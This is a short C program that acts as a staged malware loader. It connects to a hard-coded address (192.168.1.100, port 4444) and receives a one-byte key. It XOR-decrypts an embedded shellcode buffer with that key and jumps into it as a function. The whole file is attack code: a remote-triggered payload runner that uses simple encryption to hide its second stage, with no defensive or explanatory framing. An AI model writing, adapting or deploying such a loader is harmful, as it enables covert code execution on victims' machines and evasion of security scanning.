#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

char stage2[] = 
"\xeb\x3f\x5f\x80\x47\x01\x41\x80\x47\x02\x42\x80\x47\x03\x43\x80"
"\x47\x04\x44\x80\x47\x05\x45\x80\x47\x06\x46\x80\x47\x07\x47\x80"
"\x47\x08\x48\x80\x47\x09\x49\x80\x47\x0a\x4a\x80\x47\x0b\x4b\x80"
"\x47\x0c\x4c\x80\x47\x0d\x4d\x80\x47\x0e\x4e\x80\x47\x0f\x4f\xeb"
"\xbf\xe8\xbc\xff\xff\xff\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41";

void decrypt_stage2(char *buf, int len, char key) {
    for(int i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

int main() {
    int sock;
    struct sockaddr_in server;
    char buffer[1024] = {0};
    
    // Stage 1: Simple connection
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &server.sin_addr);
    
    if(connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        return 1;
    }
    
    // Receive encryption key
    recv(sock, buffer, 1, 0);
    char key = buffer[0];
    
    // Decrypt and execute stage 2
    int stage2_len = sizeof(stage2);
    decrypt_stage2(stage2, stage2_len, key);
    
    void (*stage2_func)() = (void(*)())stage2;
    stage2_func();
    
    return 0;
}